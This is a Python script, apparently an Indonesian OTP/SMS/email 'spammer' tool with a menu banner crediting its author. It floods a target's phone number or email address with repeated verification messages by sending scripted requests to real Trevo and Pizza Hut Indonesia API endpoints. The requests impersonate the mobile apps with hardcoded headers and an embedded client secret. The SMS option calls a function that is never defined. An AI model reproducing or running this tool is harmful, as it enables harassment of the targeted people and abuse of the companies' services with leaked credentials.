import os,sys,time,json,requests,emot
from colorama import Fore,Back,init
from requests import get,post
from urllib import request


def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008)
def Massal():
    nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target {W}: +62")
    trevo = requests.post("https://api-v2.trevo.my/common-users/otp/whatsapp",headers={"Host":"api-v2.trevo.my","Accept":"application/json","Cache-Control":"no-cache","X-App-Version":"3.5.3","X-App":"trevo","X-Country-Code":"ID","X-Platform":"android","X-Appsflyer-Id":"1681353044329-5958541001121242825","Content-Type":"application/json","Content-Length":"133","Accept-Encoding":"gzip, deflate","User-Agent":"okhttp/3.12.12","Connection":"close"},data=json.dumps({"clientId":"trevo","clientSecret":"gukEsPewA7aSWiboP0edr2FIb0ePhizisAwRofr4SicaFriB","language":"id","phoneNumber":"+62"+nomor})).text
    print (f"{W}[{G}✓{W}] Success Sended Spam Trevo")
def Trevo():
    nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target {W}: +62")
    jum = int(input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Jumlah {W}: "))
    for i in range(jum):
        pos = requests.post("https://api-v2.trevo.my/common-users/otp/whatsapp",headers={"Host":"api-v2.trevo.my","Accept":"application/json","Cache-Control":"no-cache","X-App-Version":"3.5.3","X-App":"trevo","X-Country-Code":"ID","X-Platform":"android","X-Appsflyer-Id":"1681353044329-5958541001121242825","Content-Type":"application/json","Content-Length":"133","Accept-Encoding":"gzip, deflate","User-Agent":"okhttp/3.12.12","Connection":"close"},data=json.dumps({"clientId":"trevo","clientSecret":"gukEsPewA7aSWiboP0edr2FIb0ePhizisAwRofr4SicaFriB","language":"id","phoneNumber":"+62"+nomor})).text
        print (f"{W}[{G}✓{W}] Success Sended Spam")
def PizzaHut():
    email = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Email Target {W}: ")
    jum = int(input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Jumlah {W}: "))
    for i in range(jum):
        pos = requests.get("https://api-prod.pizzahut.co.id/customer/v1/customer/email/"+email, headers={"Host":"api-prod.pizzahut.co.id","Content-Com.ph.id.consumer.model.type":"application/json","X-Client-Id":"b39773b0-435b-4f41-80e9-163eef20e0ab","X-Platform":"ANDROID","X-Device-Type":"phone","X-Lang":"en","X-Channel":"2","User-Agent":"Pizza Hut Indonesia/3.2.9 Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)","X-Device-Id":"b038edd6b131cd1f","Accept-Encoding":"gzip, deflate"}).text
        respon = json.loads(pos)
        if(respon['code'] == 200):
            print (f"{W}[{G}✓{W}][{G}{respon['code']}{W}] Success Sended Spam")
        else:
            print (f"{W}[{R}x{W}][{R}{respon['code']}{W}] {respon['message']}")

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

ip=requests.get('https://api.ipify.org').text
visitor=request.urlopen('https://api.countapi.xyz/hit/spammer-wa')
getvisit=json.loads(visitor.read())
localtime=time.asctime(time.localtime(time.time()))

hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

autoketik(f"""

{hijau}╭━━━┳━━━┳━━━┳━╮╭━┳━╮╭━┳━━━┳━━━╮{biru}╱╭━━━┳━━━━┳━━━╮
{hijau}┃╭━╮┃╭━╮┃╭━╮┃┃╰╯┃┃┃╰╯┃┃╭━━┫╭━╮┃{biru}╱┃╭━╮┃╭╮╭╮┃╭━╮┃
{hijau}┃╰━━┫╰━╯┃┃╱┃┃╭╮╭╮┃╭╮╭╮┃╰━━┫╰━╯┃{biru}╱┃┃╱┃┣╯┃┃╰┫╰━╯┃
{hijau}╰━━╮┃╭━━┫╰━╯┃┃┃┃┃┃┃┃┃┃┃╭━━┫╭╮╭┻{biru}━┫┃╱┃┃╱┃┃╱┃╭━━╯
{hijau}┃╰━╯┃┃╱╱┃╭━╮┃┃┃┃┃┃┃┃┃┃┃╰━━┫┃┃╰┳{biru}━┫╰━╯┃╱┃┃╱┃┃
{hijau}╰━━━┻╯╱╱╰╯╱╰┻╯╰╯╰┻╯╰╯╰┻━━━┻╯╰━╯{biru}╱╰━━━╯╱╰╯╱╰╯
{abu}-----------------------------------------
{putih}[{biru}+{putih}] {biru}Author {putih}   : Tengku Arya Saputra
{putih}[{biru}+{putih}] {abu}GitHub {putih}   : AryaSec1337
{putih}[{biru}+{putih}] {merah}Team {putih}     : Dark Clown Security
{putih}[{biru}+{putih}] {ungu}Instagram {putih}: @arryyaa_17
{W}[{biru}+{W}] Ip Kamu {putih}  :{hijau} {ip}
{W}[{biru}+{W}] Waktu/Jam {putih}:{hijau} {localtime}
{W}[{biru}+{W}] Total Run {putih}:{hijau} {getvisit['value']}
""")

print(f"{W}[{R}1{W}]  SPAM WHATSAPP")
print(f"{W}[{R}2{W}]  SPAM EMAIL")
print(f"{W}[{R}3{W}]  SPAM SMS")
print(f"{W}[{R}4{W}]  Laporkan bug/Masalah 🐞")
print(f"{W}[{R}5{W}]  Info Sosmed 👨‍💻")
print("")
pilih = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Pilih Menu {W}: ")

if pilih == "1":
    print("============================")
    print("\tSPAM WHATSAPP")
    print("============================")
    print(f"{W}[{R}1{W}]  OTP Massal")
    print(f"{W}[{R}2{W}]  Trevo")
    pilih1 = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Pilih Menu Spam Whatsapp {W}: ")
    if pilih1 == "1":
        Massal()
    elif pilih1 == "2":
        Trevo()
elif pilih == "2":
    print("============================")
    print("\tSPAM EMAIL")
    print("============================")
    print(f"{W}[{R}1{W}]  PizzaHut")
    pilih1 = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Pilih Menu Spam Email {W}: ")
    if pilih1 == "1":
        PizzaHut()
elif pilih == "3":
    print("============================")
    print("\tSPAM SMS")
    print("============================")
    print(f"{W}[{R}1{W}]  Mapclub")
    pilih1 = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Pilih Menu Spam SMS {W}: ")
    if pilih1 == "1":
        MapClub()
elif pilih == "4":
    print("Email: arya_alfahrezy@wearehackerone.com")
elif pilih == "5":
    print("Linkedin\t: https://www.linkedin.com/in/tengku-arya-saputra-3b5031224/")
    print("Email\t: arya_alfahrezy@wearehackerone.com")
else:
    print("Invalid Menunu")
